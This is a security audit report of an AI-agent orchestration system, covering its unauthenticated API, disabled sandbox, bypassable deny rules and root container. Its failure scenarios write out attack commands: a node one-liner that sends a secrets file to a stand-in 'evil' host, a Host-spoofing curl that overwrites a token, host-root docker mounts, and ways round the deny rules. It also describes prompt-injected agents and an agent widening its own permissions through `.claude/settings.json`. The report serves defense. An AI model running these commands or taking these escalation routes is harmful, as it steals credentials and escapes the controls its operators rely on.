# System security audit (2026-10-04)

Scope: the whole system, read for a Kubernetes deployment with all NetworkPolicies open (any pod, and anything that can reach the Service, can talk to any other pod). Read-only review; no source was changed. Only flaws traced to code that was read are reported; where a step depends on deployment configuration it is stated.

Areas covered: `server/api`, `server/core`, `server/exec`, `server/git`, `server/runner`, `server/agents/registry.ts`, `server/config`, `web/src/components/Markdown.tsx` and the places that render URLs, `Dockerfile`, `docker-compose.yml`, `config.example.json`, spec section 14.

Not covered: `server/orchestrator`, `server/deploy`, `server/refine` internals beyond the routes, `server/knowledge`, and the Kubernetes manifests (none exist in this tree yet). Findings there are unknown, not absent. Line numbers are approximate to a few lines where a range is given.

## Summary

| ID | Severity | Title |
|----|----------|-------|
| C1 | Critical | Agent steps run with the sandbox off and credentials readable through allowed Bash tools |
| H1 | High | The API has no authentication; the Host check is not an access control |
| H2 | High | Cross-site POST (CSRF) and clickjacking against the local API |
| H3 | High | Deny rules for `gh`, `git push`, `docker`, `kubectl` are prefix matches and bypassable through allowed `node`/`npm`/`npx`/`find` |
| H4 | High | Container runs as root and is designed around a host Docker socket |
| M1 | Medium | `POST /projects` clones any http(s) host (SSRF) and registers any directory |
| M2 | Medium | An agent can persist permissions for later steps through the worktree `.claude/` directory |
| M3 | Medium | `ui.log` tail is returned to the client without redaction |
| M4 | Medium | Onboarding redaction uses a secret list loaded once at startup |
| M5 | Medium | Unbounded SSE connections, each with its own 500 ms file poll |
| M6 | Medium | Image build is not reproducible and installs unpinned global tools |
| L1 | Low | `SAFE_ID` accepts `..`, so the step route reads `prompt.md`/`output.json` outside the run directory |
| L2 | Low | Static file prefix check lacks a path separator |
| L3 | Low | No security headers on API or static responses |
| L4 | Low | Secret hint returns the last four characters |
| L5 | Low | Redaction gaps (short values, encoded forms, generic key shapes) |
| L6 | Low | Web client renders server-supplied URLs in `href` without a scheme check |
| L7 | Low | Spec section 14 states guarantees the shipped configuration does not provide |

Checked and found sound: `Markdown.tsx` never emits raw HTML and follows only `http(s)` links; JSON request bodies are capped at 64 KiB while being read; `writeSecret` writes mode 0600 through temp file and rename and rejects multi-line values; secret names are validated with `SECRET_NAME` before they reach a path; refine project and spec ids are validated against `ID_PATTERNS.SLUG`; `git clone` is only reached with an `http(s)` URL so a leading `-` cannot become an option; git and `gh` are invoked with argument arrays (no shell) and git runs with hooks and fsmonitor disabled (`server/git/git.ts:23`); agent prompts go through stdin, not argv (`server/runner/invocation.ts:151,202`); agent env is an allowlist (`invocation.ts:26,157`); gate secrets are passed by environment inheritance, not argv (`server/exec/gate-runner.ts:96-101`).

---

## Critical

### C1. Agent steps run with the sandbox off and credentials readable through allowed Bash tools

- `config.example.json:5` ships `"sandbox": { "enabled": false }`; `server/config/config.ts:103` documents "off ... as root in the backend container", which is exactly how the Dockerfile and `docker-compose.yml` run it. `buildRoleSettings` passes the flag straight through (`server/runner/role-settings.ts:82`).
- With the sandbox off, `sandbox.network.allowedDomains` (`server/orchestrator/run.ts:194`, only `registry.npmjs.org`) is not enforced: the agent has unrestricted egress. With NetworkPolicies open it also reaches every in-cluster service.
- The only protection for credentials is `Read(...)` deny rules (`role-settings.ts:14-22,75-77`). These apply to the Read tool. The same roles are allowed `Bash(cat:*)`, `Bash(grep:*)`, `Bash(find:*)`, `Bash(node:*)`, `Bash(npm:*)`, `Bash(npx:*)` (`role-settings.ts:32-50`, granted to front, dev, test).
- HOME is passed to the agent (`invocation.ts:26`), and HOME holds `~/.teams-ai/secrets/*` (GITHUB_TOKEN, OPENROUTER_API_KEY), `~/.config/gh/hosts.yml`, `~/.claude/.credentials.json`, and in a cluster possibly a mounted kubeconfig.

Failure scenario: a Dev step is prompt-injected by repository content, a dependency README or a spec, or simply runs a malicious `postinstall` from `npm install`. It runs `cat ~/.teams-ai/secrets/GITHUB_TOKEN` (allowed by `Bash(cat:*)`) or `node -e "fetch('https://evil/'+require('fs').readFileSync(...))"` (allowed by `Bash(node:*)`, egress open). The token can create repos and push to the whole GitHub owner. The same path reads the Claude OAuth credential.

Fix:
1. Make the sandbox mandatory for agent steps: refuse to start a run when `sandbox.enabled=false` unless an explicit `unsafe` opt-in is set, and drop the `false` value from `config.example.json`.
2. Do not give agent processes the real HOME. Run each step with a per-step empty HOME and mount only the Claude credential that step needs, read-only. Keep `~/.teams-ai/secrets` and `~/.config/gh` in a different mount/user than the one agents run as.
3. In Kubernetes, run agent steps as separate Jobs/pods with their own ServiceAccount (no token automount), a default-deny egress NetworkPolicy plus an allowlist to the registry and model endpoint, and the secrets mounted only into the orchestrator pod.

---

## High

### H1. The API has no authentication; the Host check is not an access control

- `server/api/server.ts:82-86,132`: the only gate is `isAllowedHost`, a check of the `Host` header against `localhost`, `127.0.0.1`, `[::1]`. It exists against DNS rebinding in a local-browser setting. Any client that can open a TCP connection can send `Host: localhost`.
- `Dockerfile:20` sets `HOST=0.0.0.0`, and `server.ts:168` binds `process.env.HOST`. In a cluster the port is reachable by every pod (open NetworkPolicies) and by anything exposed through a Service or Ingress.
- Reachable operations include: `PUT /api/onboarding/secrets/GITHUB_TOKEN` and `OPENROUTER_API_KEY` (`server/api/onboarding-routes.ts:70-83`), `PUT /api/refine/:p/:s/secrets/:name` for any upper-case name (`server/api/refine-routes.ts:119-129`), `POST /api/projects` (`run-routes.ts:142-176`), starting, resuming and stopping runs (`run-routes.ts:186-256`), `POST /api/{claude,gh}/login` and `/code` (`onboarding-routes.ts:84-104`), and read access to prompts, plans, READMEs and every journal event (`run-routes.ts:280-376`).
- A side effect that hides the problem: a Service-name or Ingress access gets 403 `forbidden host`, which pushes operators to `port-forward` (works, because Host is `localhost`) or to rewrite the check. Neither is access control.

Failure scenario: any compromised pod in the cluster does `curl -H 'Host: localhost' -X PUT http://teams-ai:8787/teams-ai/v1/api/onboarding/secrets/GITHUB_TOKEN -d '{"value":"attacker-token"}'`, then starts runs that push code under the attacker's identity, or overwrites `OPENROUTER_API_KEY` with an attacker endpoint key to capture prompts and code.

Fix: add real authentication in front of the API (a shared bearer token from a Secret compared in constant time, or an authenticating proxy/mTLS in the cluster) and bind to `127.0.0.1` unless `HOST` is set. Keep the Host check as a second layer, but make the allowed host list configurable (the Service DNS name) instead of hard-coded. Add a NetworkPolicy that admits only the ingress proxy or operator namespace.

### H2. Cross-site POST (CSRF) and clickjacking against the local API

- `readBody` (`server.ts:88-102`) parses JSON regardless of `Content-Type`, and no route checks `Origin`. A browser page on any origin can send a "simple" cross-origin `POST` with `Content-Type: text/plain` and a JSON string body to `http://localhost:8787/...`. The request goes out with `Host: localhost:8787`, so it passes `isAllowedHost`; the page cannot read the response, but the side effect happens. `PUT` needs a preflight and is not exposed this way (no CORS headers are sent, which is correct).
- State-changing POSTs reachable this way: `POST /api/projects` (clone any http(s) repo and register it, `run-routes.ts:142-176`), `POST /api/projects/:p/specs/:s/runs` (start a run), `/stop`, `/complete`, `/readme`, `/api/refine/.../patches/:id/accept`, `/start`, and `/api/{claude,gh}/login` and `/code`.
- No `X-Frame-Options` or `frame-ancestors` (`server.ts:107-120,140`), so the UI can be framed by a hostile page and operated by clickjacking. The Host check does not help: the frame loads `localhost`.

Failure scenario: an operator with the UI open (or the port-forward running) visits a hostile page. The page POSTs `{"url":"https://attacker/x/y.git"}` to `/teams-ai/v1/api/projects`, then POSTs a run start for the project. The repository's `docs/project.json` and plan define gate commands that execute as `sh -lc` (`gate-runner.ts:103`) and agent tasks that read attacker-controlled content, so this chains to code execution and to the exposure in C1.

Fix: reject non-JSON `Content-Type` on bodies, require a custom header (for example `X-Teams-AI: 1`) or verify `Origin` equals the served origin for every non-GET, and send `Content-Security-Policy: frame-ancestors 'none'` plus `X-Frame-Options: DENY`. The H1 token also closes this because a cross-site simple request cannot attach it.

### H3. Deny rules for `gh`, `git push`, `docker`, `kubectl` are prefix matches and bypassable

- `ALWAYS_DENIED` (`server/agents/registry.ts:28-36`) is `Bash(gh:*)`, `Bash(git push:*)`, `Bash(docker:*)`, `Bash(kubectl:*)`; `buildRoleSettings` adds them to `permissions.deny` (`role-settings.ts:75-80`). They match a command line by prefix.
- The same roles are allowed `node:*`, `npm:*`, `npx:*` (arbitrary code) and `find:*` (`-exec`). `node -e "require('child_process').execSync('gh pr merge ...')"`, `npm exec -- gh ...`, or `find . -exec git push \;` do not start with a denied prefix.
- Spec section 14 relies on these rules ("`gh`, `git push`, `docker` and `kubectl` are denied").

Failure scenario: an agent step runs `node -e "...execSync('gh api -X DELETE repos/OWNER/REPO')"` using the `gh` login in HOME (see C1), or `kubectl delete ns` if a kubeconfig is reachable, or `docker run -v /:/h ...` if a socket is mounted.

Fix: treat the deny list as advisory. The enforcing controls must be: no credentials in the agent's filesystem view (C1 fix), no `docker`/`kubectl`/`gh` binaries in the agent image or PATH, no kubeconfig or docker socket in the agent pod, and egress limited by NetworkPolicy. If `node`/`npx` stay allowed, drop `find:*` (use `ls`/`grep`) and note that `npm run` executes whatever the repository defines.

### H4. Container runs as root and is designed around a host Docker socket

- `Dockerfile` has no `USER`; the CMD path is `/root/.teams-ai/...` (`Dockerfile:22`) and the compose volumes mount into `/root` (`docker-compose.yml`). `docker.io` is installed in the image (`Dockerfile:4-5`) and compose mounts the host daemon socket and sets `seccomp:unconfined` and `apparmor:unconfined`.
- The orchestrator executes repository-defined gate commands through the daemon (`gate-runner.ts:66-103`: `docker run ... sh -lc <gate.command>` with a bind mount of the worktree). Access to the daemon is host root.

Failure scenario: any code execution in the backend (H1, H2, C1) becomes root on the node that owns the socket: `docker run -v /:/h alpine ...`. In Kubernetes the equivalents are a hostPath-mounted `docker.sock`, a privileged pod, or `seccomp: Unconfined` added to make bwrap work; each gives the same outcome and none is a supported isolation boundary.

Fix: run as a non-root user with `readOnlyRootFilesystem`, `allowPrivilegeEscalation: false`, dropped capabilities and the default seccomp profile. Execute gates and agent steps as Kubernetes Jobs created through a namespaced ServiceAccount limited to `jobs`/`pods` in one namespace, never through a host socket, and remove `docker.io` from the image once that path exists.

---

## Medium

### M1. `POST /projects` clones any http(s) host (SSRF) and registers any directory

- `run-routes.ts:149-164`: only the scheme (`http`/`https`) and a `/owner/repo(.git)` shape are checked. Any hostname passes, including `169.254.169.254`, `kubernetes.default.svc`, cluster-internal services, and anything reachable with open NetworkPolicies. `git clone` (`run-routes.ts:51-55`) follows the initial redirect (git default `http.followRedirects=initial`) and returns stderr to the client in the 400 message (`run-routes.ts:54`), which is a semi-blind probe of internal HTTP endpoints.
- `run-routes.ts:166`: the other branch takes `dir` verbatim (`path.resolve(str(payload, 'dir'))`) and registers it with `addProject` (`:171`) after only a `docs/project.json` read. Any directory on the server that holds such a file (another workspace, or a repo an agent wrote) becomes a project the UI can run. The error branch echoes `err.message` (`:168-170`); a JSON parse error for an existing file can include a snippet of that file.

Fix: resolve the host and refuse loopback, link-local and private ranges, or restrict to an allowlist (github.com plus configured hosts); pass `-c http.followRedirects=false` and `--` before the URL. Restrict `dir` to paths under `paths.workspaces`, and do not echo raw parser messages.

### M2. An agent can persist permissions for later steps through the worktree `.claude/` directory

- Agents run with `--setting-sources project` (`invocation.ts:11`), so `.claude/settings.json` in the product worktree is loaded. `Edit(.claude/**)` is denied (`role-settings.ts:78`, `registry.ts:35`), but that rule covers the file-edit tools only. Roles with `Bash(echo:*)`, `Bash(node:*)` or `Bash(npm:*)` can write that file through a shell redirect or a script (the write is inside the worktree, which is writable).
- `ensureTrusted` marks every worktree as trusted (`invocation.ts:213-240`), and the CLI honours project-level `permissions.allow` only for trusted workspaces (comment at `invocation.ts:209-211`). So a file the agent writes can become effective policy in the next step in that worktree.

Failure scenario: step N writes `.claude/settings.json` with `permissions.allow: ["Bash(*)"]`. Step N+1 starts with the widened policy. Unless the orchestrator deletes or resets `.claude/` between steps (not seen in the code read), the escalation persists; if `.claude` is committed it also reaches the repository. Unverified: whether project-level allow rules can override the `--settings` deny list; the allow widening alone is enough for the scenario.

Fix: before each step, delete or overwrite `<worktree>/.claude/settings*.json`, or stop trusting the worktree and rely on `--settings` only; add `.claude/` to `DEFAULT_COMMIT_EXCLUDES` (`server/git/git.ts:20`) so it is never committed.

### M3. `ui.log` tail is returned to the client without redaction

- The CLI child's stdout and stderr go straight to `ui.log` (`server/api/run-control.ts:85-90`). On a failed start, `run-routes.ts:115-116` returns the last 500 characters of that file in the 500 response body, with no `redactSecrets`. The redaction applied to journal events elsewhere (for example `server/runner/step.ts:188`) does not cover this path.

Failure scenario: a start fails after the process printed a token-bearing line (an `npm`/`git` error echoing a URL with credentials, a stack trace including an env value). The line reaches the browser and any proxy log in clear text. Whether the CLI prints such a line was not traced; the missing redaction on this path was.

Fix: pass the tail through `redactSecrets` with the loaded secret values before returning it (the same applies to `waitForRunJournal`, `run-control.ts:78-80`).

### M4. Onboarding redaction uses a secret list loaded once at startup

- `server/api/onboarding-routes.ts:30-32` loads the known secret values once in the constructor into `knownCache`, which both `LoginSession`s use to redact the login transcript streamed over SSE (`:34-35,105-115`). The `PUT .../secrets/:name` handler (`:70-83`) writes a new value but never refreshes `knownCache`.

Failure scenario: start with no secrets, store `GITHUB_TOKEN`, then run `gh` login; the transcript is only masked by the generic patterns in `redact.ts`, so a token that does not match one of those shapes (fine-grained variants, OpenRouter variants, other providers) is streamed to every SSE subscriber.

Fix: reload on each write (`knownCache = Object.values(await loadSecrets(...))`) or read lazily per chunk with a short TTL.

### M5. Unbounded SSE connections, each with its own 500 ms file poll

- `server/api/server.ts:139-153` and `journal-tail.ts:14-55`: every `GET .../events` opens a poll loop (`fs.open` and `stat` every 500 ms) with no per-client or global cap and no idle timeout. Routes: run events (`run-routes.ts:331-358`), refine events (`refine-routes.ts:136-158`), onboarding events (`onboarding-routes.ts:105-115`). The replay path serialises the whole journal first (`run-routes.ts:354`).
- Without authentication (H1) a single pod can exhaust file descriptors and the event loop with a few thousand connections.

Fix: cap concurrent streams (global and per remote address), share one tail per file across subscribers, and set `server.requestTimeout`/`headersTimeout` explicitly.

### M6. Image build is not reproducible and installs unpinned global tools

- `Dockerfile:1` uses the floating tag `node:22-bookworm`; `:10` installs `@anthropic-ai/claude-code` with no version; `:14` installs `npm@12` unpinned. A compromised or merely changed release runs as root in the one image that holds all secrets.
- There is no `HEALTHCHECK` and no non-root user (H4). `.dockerignore` excludes `node_modules`, `.git`, `*.log` but not `.env*`, so a developer `.env` in the build context would be copied by `COPY . .` (`Dockerfile:17`).

Fix: pin the base image by digest and the two global packages by exact version, add `.env*` and `config.json` to `.dockerignore`, and add a probe on a cheap route.

---

## Low

### L1. `SAFE_ID` accepts `..`

- `server/api/run-index.ts:9`: `/^[A-Za-z0-9_.-]+$/` matches `.` and `..`. In `GET /api/runs/:runId/steps/:stepId` (`run-routes.ts:360-376`) the join `path.join(runsDir, runId, 'steps', stepId)` with `runId=..` and `stepId=..` becomes `<runs-parent>/prompt.md` and `output.json`. File names are fixed, so only files with those names outside the run directory are readable. The events route (`:331-358`) has the same pattern with `events.ndjson`.
- Fix: reject ids that are `.` or `..` (or start with a dot) in `SAFE_ID`; it is also used to filter directory names at `run-index.ts:119`.

### L2. Static file prefix check lacks a path separator

- `server/api/server.ts:110`: `file.startsWith(path.resolve(dir))` accepts a sibling directory such as `<dir>-secrets/x`. Traversal through `..` is blocked because `URL` normalises dot segments, so exploitation needs a sibling directory with the same prefix.
- Fix: compare against `resolve(dir) + path.sep`.

### L3. No security headers

- `server.ts:107-120,140`: static responses carry only `content-type`; no `X-Content-Type-Options`, CSP, `Referrer-Policy`, or framing protection. SSE and JSON responses likewise. Fix as in H2; a CSP of `default-src 'self'` suits this client.

### L4. Secret hint returns the last four characters

- `refine-routes.ts:127` returns `value.trim().slice(-4)`. For short or low-entropy secrets this is a real fraction of the value, and it is returned to anyone who can call the route.
- Fix: return `present: true` only, or a fixed-length mask.

### L5. Redaction gaps

- `server/core/redact.ts:27` skips known values shorter than 4 characters; matching is exact-string, so URL-encoded, base64 or line-wrapped forms pass; the generic patterns (`:9-18`) cover Anthropic, OpenRouter, GitHub, AWS and `*_TOKEN=` shapes only. Output from agents, gates and tools reaches the journal and UI through this function, so a gap is a leak.
- Fix: also mask base64 and URL-encoded forms of each known value, and register every secret value from `loadSecrets` on every path (see M4 for the one that does not).

### L6. Web client renders server-supplied URLs in `href` without a scheme check

- `web/src/components/LoginCard.tsx:83` (`state.url`), `TaskDetail.tsx:29` (`d.pr.url`), `pages/Run.tsx:213` (`p.url`). The Markdown renderer filters to `http(s)` (`Markdown.tsx:12`) but these three do not. The values originate from CLI output and journal events. Today they come from `gh`/login output, so exploitation needs a poisoned journal or a hostile login transcript; React does not block `javascript:` URLs in `href`.
- Fix: share one `safeHttpUrl()` helper and use it at all four sites.

### L7. Spec section 14 states guarantees the shipped configuration does not provide

`docs/superpowers/specs/2026-09-23-teams-ai-poc-design.md` section 14 says agents are confined to the working directory with an allowlisted network, and "have no ... secrets ... in their environment". As shipped: the sandbox is off in the container setup (C1), HOME exposes the credential stores, deny rules are bypassable (H3), the Dockerfile and compose file give the process the Docker daemon (H4), and the section never mentions API authentication (H1/H2). The "Residual risk" bullet covers `gh` only. Update section 14 to describe the Kubernetes deployment as built and to list these as open items until fixed.

---

## Suggested order of work

1. C1 and H4 together (per-step pods or user, no real HOME, sandbox required): this removes the credential theft path and the host-root path.
2. H1 and H2 (token plus Origin/Content-Type checks, headers): small, local to `server/api/server.ts`.
3. H3 documentation change and image hardening; M2 `.claude/` reset; M1 clone and `dir` restrictions.
4. M3, M4, M5, M6, then the Low items, and finally the spec section 14 rewrite.

## Status update 2026-10-05 (plan 40)

- **H4:** the host Docker socket is no longer mounted; gates and docker-local deploys run on a rootless `dind` sidecar, so an
  agent-written Dockerfile or compose file cannot reach the host daemon. Backend drops all capabilities; gate containers drop
  capabilities, set `no-new-privileges` and a pids limit. Not verified live yet.
- **C1/H3:** absolute `Read` denies for the orchestrator's real HOME added. Still open: whether the sandbox confines reads outside
  the worktree (probe needs a `claude` login), the agent-readable credential copy, and `docker`/`gh` binaries on the agent PATH.
- **Egress:** agent steps have no network restriction beyond the sandbox's Bash `allowedDomains` (human decision, accepted risk).
